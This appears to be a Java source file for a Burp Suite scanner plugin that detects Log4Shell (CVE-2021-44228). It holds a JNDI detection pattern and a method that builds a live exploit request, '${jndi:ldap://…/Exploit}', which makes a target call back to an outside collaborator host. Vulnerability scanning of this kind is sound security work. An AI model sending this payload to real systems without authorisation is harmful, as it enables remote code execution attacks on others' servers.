package com.scanner.vuln;

import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.scanner.util.CollaboratorHelper;

import java.util.Optional;
import java.util.regex.Pattern;

public class Log4jDetector implements VulnerabilityDetector {

    private static final String VULN_NAME = "CVE-2021-44228 Log4j Remote Code Execution";
    private static final String JNDI_PAYLOAD_PATTERN = "${jndi:";

    private final CollaboratorHelper collaboratorHelper;

    public Log4jDetector(CollaboratorHelper collaboratorHelper) {
        this.collaboratorHelper = collaboratorHelper;
    }

    @Override
    public String vulnerabilityName() {
        return VULN_NAME;
    }

    @Override
    public boolean isVulnerable(HttpRequestResponse requestResponse) {
        String requestBody = requestResponse.request().bodyToString();
        String url = requestResponse.request().url();

        return containsJndiPayload(requestBody) || containsJndiPayload(url);
    }

    @Override
    public Optional<HttpRequest> buildExploitRequest(HttpRequest originalRequest) {
        String collaboratorPayload = collaboratorHelper.generatePayload();
        String jndiUrl = "ldap://" + collaboratorPayload + "/Exploit";

        HttpRequest exploitRequest = originalRequest.withBody("${jndi:" + jndiUrl + "}");
        return Optional.of(exploitRequest);
    }

    private boolean containsJndiPayload(String content) {
        return content != null && content.contains(JNDI_PAYLOAD_PATTERN);
    }
}
